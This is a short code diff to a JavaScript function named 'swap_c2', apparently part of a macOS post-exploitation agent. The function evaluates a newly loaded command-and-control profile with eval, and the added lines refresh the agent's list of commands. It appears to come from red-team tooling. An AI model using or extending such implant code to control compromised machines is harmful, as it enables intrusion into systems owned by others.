@@ -4,6 +4,8 @@ exports.swap_c2 = function(task, command, params){
     try{
         var file_data = $.NSString.alloc.initWithDataEncoding(profile, $.NSUTF8StringEncoding).js;
         eval(file_data);
+        //now that our new c2 is set, update the commands list
+        C2.setConfig({"commands": Object.keys(commands_dict)});
     }catch(error){
         return "Failed to load new profile";
     }
